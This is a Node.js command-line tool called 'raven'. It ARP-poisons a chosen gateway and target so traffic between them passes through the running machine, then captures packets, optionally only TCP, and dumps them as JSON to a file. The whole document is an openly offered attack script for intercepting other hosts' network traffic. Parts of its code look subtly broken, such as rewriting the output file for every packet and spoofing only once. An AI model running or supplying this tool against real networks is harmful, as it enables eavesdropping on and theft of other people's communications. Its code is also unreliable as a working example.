#!/usr/bin/env node
// raven
// author Tristan Messner
const pcap = require("pcap2");
const arpjs = require("arpjs");
const fs = require("fs");
//check for all args
if(process.argv.length < 3 ){
  console.log("usage raven <gateway> <target>"); 
  process.exit(1);
}
//check if user is root
if(process.getuid() != 0 ){
  console.log("run as root user not sudo");
}

function spoof(gateway,target){
    //tell gateway that I am the target
    arpjs.poison(gateway,target);
    //tell target that I am gateway
    arpjs.poison(target,gateway);

}

let timeout = setTimeout(function(){spoof(process.argv[2],process.argv[3]);},10000);
//empty var to use as session
var pcapSession;

// if statement evaulates
// need for filter when
// program is run
//

if(process.argv.indexOf("-t") != -1){
    pcapSession = new pcap.Session("",{
        filter: 'ip proto \\tcp'
    });
}else{
    pcapSession = new pcap.Session();
}

pcapSession.on('packet',function(rawPacket){
    var packets_file = fs.createWriteStream("packets.txt",defaults = {
  flags: 'w',
  defaultEncoding: 'utf8',
  fd: null,
  mode: 0o666,
  autoClose: true
});
    packets_file.once('open',function(fd){
      var packet_ = pcap.decode.packet(rawPacket);
      packets_file.write(JSON.stringify(packet_));
      packets_file.write('\n');
      packets_file.end();
    });
});
